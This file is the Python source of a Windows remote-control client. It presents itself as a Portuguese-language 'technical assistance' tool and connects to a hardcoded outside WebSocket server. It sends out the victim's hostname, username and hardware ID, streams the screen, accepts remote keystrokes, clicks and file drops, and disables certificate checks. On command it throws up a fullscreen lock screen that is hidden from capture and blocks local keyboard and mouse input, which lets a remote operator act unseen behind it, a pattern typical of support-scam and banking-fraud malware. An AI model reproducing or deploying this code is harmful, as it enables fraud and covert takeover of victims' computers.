import websocket
import json
import threading
import time
import base64
import os
import platform
import getpass
import hashlib
import ctypes
import ctypes.wintypes as wintypes
import ssl
import sys
import subprocess
from io import BytesIO

import mss
from PIL import Image
import pyautogui
import pyperclip

SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
FRAME_INTERVAL = 0.04
QUALITY = 70
SCALE = 0.75

current_quality = QUALITY
current_scale = SCALE

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

client_id = None
is_connected = False
panel_connected = False
ws_app = None
running = True
screen_locked = False
input_blocked = False

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Hooks
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14
keyboard_hook = None
mouse_hook = None

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)


def low_level_keyboard_proc(nCode, wParam, lParam):
    if input_blocked and nCode >= 0:
        return 1
    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)


def low_level_mouse_proc(nCode, wParam, lParam):
    if input_blocked and nCode >= 0:
        return 1
    return user32.CallNextHookEx(mouse_hook, nCode, wParam, lParam)


kb_callback = HOOKPROC(low_level_keyboard_proc)
ms_callback = HOOKPROC(low_level_mouse_proc)


def install_hooks():
    global keyboard_hook, mouse_hook
    keyboard_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, kb_callback, kernel32.GetModuleHandleW(None), 0)
    mouse_hook = user32.SetWindowsHookExW(WH_MOUSE_LL, ms_callback, kernel32.GetModuleHandleW(None), 0)


def uninstall_hooks():
    global keyboard_hook, mouse_hook
    if keyboard_hook:
        user32.UnhookWindowsHookEx(keyboard_hook)
    if mouse_hook:
        user32.UnhookWindowsHookEx(mouse_hook)


def message_loop():
    msg = wintypes.MSG()
    while running:
        if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        time.sleep(0.01)


def set_console_title(title):
    if os.name == 'nt':
        try:
            kernel32.SetConsoleTitleW(title)
        except:
            pass


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_app_hash():
    return hashlib.md5(f"{platform.node()}{platform.machine()}".encode()).hexdigest()[:10].lower()


def print_header():
    clear_screen()
    print("\n  " + "=" * 50)
    print("  |                                                |")
    print("  |            ASSISTENCIA TECNICA                 |")
    print("  |                                                |")
    print("  " + "=" * 50)
    print(f"  Session: {get_app_hash()}\n")


def print_status(status, id_code=None):
    print_header()
    if status == "connecting":
        set_console_title("Conectando...")
        print("  Status: Conectando ao servidor...")
    elif status == "waiting":
        set_console_title(f"Aguardando - {id_code}")
        print("  Status: AGUARDANDO CONEXAO\n")
        print("  " + "=" * 50)
        print(f"  |         CODIGO: {id_code}                        |")
        print("  " + "=" * 50)
        print("\n  Informe este codigo ao tecnico.")
    elif status == "connected":
        set_console_title(f"Conectado - {id_code}")
        print("  Status: SESSAO ATIVA\n")
        print("  " + "*" * 50)
        print("  *           CONEXAO ESTABELECIDA               *")
        print("  " + "*" * 50)
        print(f"\n  ID: {id_code}")
    elif status == "disconnected":
        set_console_title(f"Desconectado - {id_code}")
        print("  Status: AGUARDANDO RECONEXAO")
        print(f"  Codigo: {id_code}")


def get_hwid():
    try:
        result = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True, timeout=5, creationflags=0x08000000)
        uuid = result.stdout.strip().split('\n')[-1].strip()
        result2 = subprocess.run(['wmic', 'nic', 'where', 'NetEnabled=true', 'get', 'MACAddress'], capture_output=True, text=True, timeout=5, creationflags=0x08000000)
        mac = [l.strip() for l in result2.stdout.split('\n') if ':' in l]
        return hashlib.sha256(f"{uuid}{mac[0] if mac else ''}".encode()).hexdigest()[:16].upper()
    except:
        return "N/A"


def get_system_info():
    return {"hostname": platform.node(), "username": getpass.getuser(), "os": f"{platform.system()} {platform.release()}", "hwid": get_hwid()}


# ============================================
# LOCK SCREEN - WDA_EXCLUDEFROMCAPTURE
# ============================================

def show_lock_screen(message):
    global screen_locked, input_blocked

    if screen_locked:
        return

    screen_locked = True
    input_blocked = True

    def run_lock():
        global screen_locked, input_blocked
        try:
            import tkinter as tk

            root = tk.Tk()
            root.title("")
            root.configure(bg='#0a0a0a')
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.overrideredirect(True)

            root.protocol("WM_DELETE_WINDOW", lambda: None)
            for k in ['<Alt-F4>', '<Escape>', '<Alt-Tab>']:
                root.bind(k, lambda e: 'break')

            root.update_idletasks()

            # Aplicar WDA_EXCLUDEFROMCAPTURE (Windows 10 2004+)
            hwnd = user32.GetParent(root.winfo_id()) or root.winfo_id()
            user32.SetWindowDisplayAffinity(hwnd, 0x11)

            frame = tk.Frame(root, bg='#0a0a0a')
            frame.place(relx=0.5, rely=0.5, anchor='center')

            tk.Label(frame, text="\U0001F512", font=('Segoe UI Emoji', 80), bg='#0a0a0a', fg='#f59e0b').pack(pady=20)
            tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'), bg='#0a0a0a', fg='#fff', wraplength=800).pack(pady=15)
            tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 14), bg='#0a0a0a', fg='#666').pack(pady=10)

            def check():
                if not screen_locked:
                    root.destroy()
                    return
                root.after(500, check)

            root.after(500, check)
            root.mainloop()
        except:
            pass

    threading.Thread(target=run_lock, daemon=True).start()
    time.sleep(0.3)


def hide_lock_screen():
    global screen_locked, input_blocked
    screen_locked = False
    input_blocked = False


# ============================================
# CAPTURA DE TELA (NORMAL - SEM TRUQUES)
# ============================================

def capture_screen():
    global panel_connected, running, current_quality, current_scale

    sct = mss.mss()

    while running:
        if not panel_connected:
            time.sleep(0.5)
            continue

        try:
            img = Image.frombytes('RGB', (shot := sct.grab(sct.monitors[1])).size, shot.bgra, 'raw', 'BGRX')
            img = img.resize((int(img.width * current_scale), int(img.height * current_scale)), Image.LANCZOS)

            buf = BytesIO()
            img.save(buf, format='JPEG', quality=current_quality, optimize=True)

            if ws_app and is_connected:
                ws_app.send(json.dumps({
                    "type": "screen-frame",
                    "clientId": client_id,
                    "frame": base64.b64encode(buf.getvalue()).decode(),
                    "width": img.width,
                    "height": img.height
                }))

            time.sleep(FRAME_INTERVAL)
        except:
            time.sleep(0.5)


# ============================================
# HANDLERS
# ============================================

def handle_mouse_move(d):
    try: pyautogui.moveTo(int(d['x']/current_scale), int(d['y']/current_scale), duration=0)
    except: pass

def handle_mouse_click(d):
    try:
        x, y = int(d['x']/current_scale), int(d['y']/current_scale)
        btn = d.get('button', 'left')
        if btn == 'right': pyautogui.click(x, y, button='right')
        elif btn == 'middle': pyautogui.click(x, y, button='middle')
        else: pyautogui.click(x, y, clicks=d.get('clicks', 1))
    except: pass

def handle_mouse_scroll(d):
    try: pyautogui.scroll(d.get('delta', 0))
    except: pass

def handle_key_press(d):
    try:
        k = d.get('key', '')
        m = {'Enter':'enter','Backspace':'backspace','Tab':'tab','Escape':'escape','ArrowUp':'up','ArrowDown':'down','ArrowLeft':'left','ArrowRight':'right','Delete':'delete','Home':'home','End':'end','PageUp':'pageup','PageDown':'pagedown',' ':'space'}
        for i in range(1,13): m[f'F{i}'] = f'f{i}'
        pyautogui.press(m.get(k, k))
    except: pass

def handle_key_combination(d):
    try:
        m = {'Control':'ctrl','Alt':'alt','Shift':'shift','Meta':'win'}
        pyautogui.hotkey(*[m.get(k, k.lower()) for k in d.get('keys', [])])
    except: pass

def handle_clipboard_set(d):
    try: pyperclip.copy(d.get('content', ''))
    except: pass

def handle_file_upload(d):
    try:
        fn = ''.join(c for c in d.get('filename', 'file') if c.isalnum() or c in '._-')[:100]
        with open(os.path.join(os.path.expanduser('~/Desktop'), fn), 'wb') as f:
            f.write(base64.b64decode(d.get('content', '')))
        ws_app.send(json.dumps({"type": "file-upload-result", "clientId": client_id, "success": True, "filename": fn}))
    except Exception as e:
        ws_app.send(json.dumps({"type": "file-upload-result", "clientId": client_id, "success": False, "filename": d.get('filename', ''), "error": str(e)[:100]}))


# ============================================
# WEBSOCKET
# ============================================

def on_message(ws, msg):
    global client_id, panel_connected, current_quality, current_scale, running
    try:
        d = json.loads(msg)
        t = d.get('type')
        if t == 'registered': client_id = d.get('clientId'); print_status("waiting", client_id)
        elif t == 'panel-connected': panel_connected = True; print_status("connected", client_id)
        elif t == 'panel-disconnected': panel_connected = False; hide_lock_screen(); print_status("disconnected", client_id)
        elif t == 'mouse-move': handle_mouse_move(d)
        elif t == 'mouse-click': handle_mouse_click(d)
        elif t == 'mouse-scroll': handle_mouse_scroll(d)
        elif t == 'key-press': handle_key_press(d)
        elif t == 'key-combination': handle_key_combination(d)
        elif t == 'clipboard-set': handle_clipboard_set(d)
        elif t == 'file-upload': handle_file_upload(d)
        elif t == 'set-quality': current_quality = d.get('quality', 70); current_scale = d.get('scale', 0.75)
        elif t == 'lock-screen': show_lock_screen(d.get('message', 'Aguarde...'))
        elif t == 'unlock-screen': hide_lock_screen()
        elif t == 'disconnect-client': hide_lock_screen(); running = False; time.sleep(1); os._exit(0)
    except: pass

def on_error(ws, e): pass
def on_close(ws, s, m):
    global is_connected, panel_connected
    is_connected = False; panel_connected = False; hide_lock_screen()

def on_open(ws):
    global is_connected
    is_connected = True
    ws.send(json.dumps({"type": "register-client", **get_system_info()}))


def main():
    global ws_app, running

    print_status("connecting")

    install_hooks()
    threading.Thread(target=message_loop, daemon=True).start()
    threading.Thread(target=capture_screen, daemon=True).start()

    while running:
        try:
            ws_app = websocket.WebSocketApp(SERVER_URL, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close)
            ws_app.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        except KeyboardInterrupt:
            running = False
            break
        except:
            time.sleep(5)

    uninstall_hooks()


if __name__ == "__main__":
    main()
